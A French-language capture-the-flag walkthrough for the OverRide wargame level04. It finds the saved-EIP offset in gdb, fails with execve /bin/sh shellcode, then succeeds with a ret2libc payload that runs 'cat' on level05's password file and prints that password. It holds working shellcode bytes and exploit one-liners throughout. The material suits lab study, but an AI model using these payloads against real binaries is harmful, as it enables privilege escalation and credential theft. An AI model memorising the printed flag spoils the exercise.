@@ -1,0 +1,171 @@
+-----> faisons qq tests:
+-----> On sait deja que buff commence a 0x20 et i est a 0xa8. La difefrence fait 168 - 32 = 136
+-----> Au moment du return dans le fils on a:
+0x0804881f <+343>:	lea    -0x8(%ebp),%esp
+0x08048822 <+346>:	pop    %ebx
+0x08048823 <+347>:	pop    %edi
+0x08048824 <+348>:	pop    %ebp
+0x08048825 <+349>:	ret
+-----> Du coup 0x8 + 0x4*3 = 20
+-----> Dans toute logique si on ecrit 136 caracateres + 20, les 4 prochains seront l'EIP.
+-----> examinons ca:
+level04@OverRide:~$ python -c 'print "A"*156+"B"*4'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+level04@OverRide:~$ gdb ./lvel04
+(gdb) set follow-fork-mode child
+(gdb) set detach-on-fork off
+(gdb) r
+Starting program: /home/users/level04/level04
+[New process 2624]
+Give me some shellcode, k
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 2632]
+0x42424242 in ?? ()
+(gdb)
+
+------> on reecrit bien l'EIP...
+------> On recupere l'adresse de buff et si ca marche pas on essaiera l'environement:
+...
+0x08048825 <+349>:	ret
+End of assembler dump.
+(gdb) b *0x08048825
+Breakpoint 2 at 0x8048825
+
+-----> ESP a augmenter du coup on affiche esp 100 addresse en arriere:
+(gdb) x/100wx $esp-0x100
+0xffffd61c:	  0x0000000a	0x00000000	0xf7e30424	0x00000019
+0xffffd62c:	  0x00000000	0xffffd718	0xffffd680	0x00000000
+0xffffd63c:	  0xfbad2288	0xffffd718	0xf7ff0a50	0xf7fd08b8
+0xffffd64c:	  0xffffd680	0x00000000	0xffffd700	0xffffd718
+0xffffd65c:	  0x08048763	0xffffd680	0x00000000	0x00000000
+0xffffd66c:	  0x00000000	0x00000b80	0x00000000	0xf7fdc714
+0xffffd67c:	  0x00000000	0x41414141	0x41414141	0x41414141
+0xffffd68c:	  0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd69c:	  0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd6ac:	  0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd6bc:	  0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd6cc:	  0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd6dc:	  0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd6ec:	  0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd6fc:	  0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd70c:	  0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd71c:	  0x42424242	0x00000000	0xffffd7b4	0xffffd7bc
+0xffffd72c:	  0xf7fd3000	0x00000000	0xffffd71c	0xffffd7bc
+0xffffd73c:	  0x00000000	0x080482e0	0xf7fceff4	0x00000000
+0xffffd74c:	  0x00000000	0x00000000	0x0cbb054f	0x3bbce15f
+0xffffd75c:	  0x00000000	0x00000000	0x00000000	0x00000001
+0xffffd76c:	  0x08048580	0x00000000	0xf7ff0a50	0xf7e45429
+0xffffd77c:	  0xf7ffcff4	0x00000001	0x08048580	0x00000000
+0xffffd78c:	  0x080485a1	0x080486c8	0x00000001	0xffffd7b4
+0xffffd79c:	  0x08048830	0x080488a0	0xf7feb620	0xffffd7ac
+
+------> L'adresse de notre buffer se trouve en 0xffffd680.
+level04@OverRide:~$ python -c 'print "\x90"*131+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\xff\xff\xd6\xbc"[::-1]' | ./level04
+Give me some shellcode, k
+ls
+^C
+
+-----> marche pas...
+-----> relance de gdb:
+
+level04@OverRide:~$ bash | gdb ./level04
+(gdb) echo set follow-fork-mode child
+(gdb) echo r
+Starting program: /home/users/level04/level04
+[New process 2689]
+Give me some shellcode
+python -c 'print "\x90"*131+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\xff\xff\xd6\xbc"[::-1]'
+
+Program received signal SIGSEGV, Segmentation fault.
+level04@OverRide:~$ [Switching to process 2689]
+0xffffd713 in ?? ()
+
+------> AH!
+------> essayons l'environnement:
+level04@OverRide:~$ nano /tmp/addr.c
+level04@OverRide:~$ ls
+level04
+level04@OverRide:~$ gcc /tmp/addr.c -o /tmp/a.out
+level04@OverRide:~$ export SHELLCODE=`python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+level04@OverRide:~$ /tmp/a.out SHELLCODE ./level04
+'SHELLCODE' will be at 0x7fffffffe882
+level04@OverRide:~$
+
+----> Bon on oublie ca marche pas non plus
+----> En Ret2Libc:
+La methode c'est on ecrit 156 caracteres pour arriver a l'adresse d'EIP
+du coup
+"A"*156 + adresse de system + "JUNK" + adresse de "/bin/sh"...
+Moi je vais utiliser un "cat /home/users/level05/.pass" dans une variable d'environnement
+
+pour ca on export une nouvelle variable d'environnement et on recherche a tatons pour faire un system("cat /home/users/level05/.pass"); puis exit();
+---> On recupere l'adresse de system et exit dans gdb:
+
+level04@OverRide:~$ gdb ./level04
+(gdb) b main
+Breakpoint 1 at 0x80486cd
+(gdb) r
+Starting program: /home/users/level04/level04
+
+Breakpoint 1, 0x080486cd in main ()
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+(gdb) p *((char **)environ)
+$3 = 0xffffd8ef "SHELL=/bin/bash"
+
+----> Maintenant on setup tout ca et on voit si ca marche:
+
+level04@OverRide:~$ export DOOM="cat /home/users/level05/.pass"
+level04@OverRide:~$ python -c 'print "A"*156+"\xf7\xe6\xae\xd0"[::-1]+"\xf7\xf8\x97\xec"[::-1]+"\xff\xff\xd8\xef"[::-1]' | ./level04
+Give me some shellcode, k
+
+----> rien ne se passe.. augmentons l'adresse de "cat ..." (qui la n'est pas "cat..." mais "SHELL=..."
+
+level04@OverRide:~$ python -c 'print "A"*156+"\xf7\xe6\xae\xd0"[::-1]+"\xf7\xf8\x97\xec"[::-1]+"\xff\xff\xd8\xff"[::-1]' | ./level04
+Give me some shellcode, k
+sh: 1: 52627: not found
+
+------> En regardant l'env
+
+level04@OverRide:~$ env
+TERM=xterm-256color
+SHELL=/bin/bash
+SSH_CLIENT=10.12.4.11 52627 4242
+OLDPWD=/home/users/level04
+SSH_TTY=/dev/pts/1
+DOOM=cat /home/users/level05/.pass
+USER=level04
+LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:
+MAIL=/var/mail/level04
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+PWD=/home/users/level04
+LANG=en_US.UTF-8
+SHLVL=1
+HOME=/home/users/level04
+LANGUAGE=en_US:en
+LOGNAME=level04
+SSH_CONNECTION=10.12.4.11 52627 10.12.1.101 4242
+LESSOPEN=| /usr/bin/lesspipe %s
+LESSCLOSE=/usr/bin/lesspipe %s %s
+_=/usr/bin/env
+
+----> On est au niveau de "SSH_CLIENT=10.12.4.11 52627 4242".
+----> On continue d'augmenter la valeur pour tomber sur "DOOM=cat /home/users/level05/.pass":
+
+level04@OverRide:~$ python -c 'print "A"*156+"\xf7\xe6\xae\xd0"[::-1]+"\xf7\xf8\x97\xec"[::-1]+"\xff\xff\xd9\x50"[::-1]' | ./level04
+Give me some shellcode, k
+sh: 1: /home/users/level05/.pass: Permission denied
+
+----> On y est presque !
+----> Si j'avance de 3 je tomberais sur "cat  /home/users/level05/.pass"
+
+level04@OverRide:~$ python -c 'print "A"*156+"\xf7\xe6\xae\xd0"[::-1]+"\xf7\xf8\x97\xec"[::-1]+"\xff\xff\xd9\x53"[::-1]' | ./level04
+Give me some shellcode, k
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+
+
+Bingo !!!
+
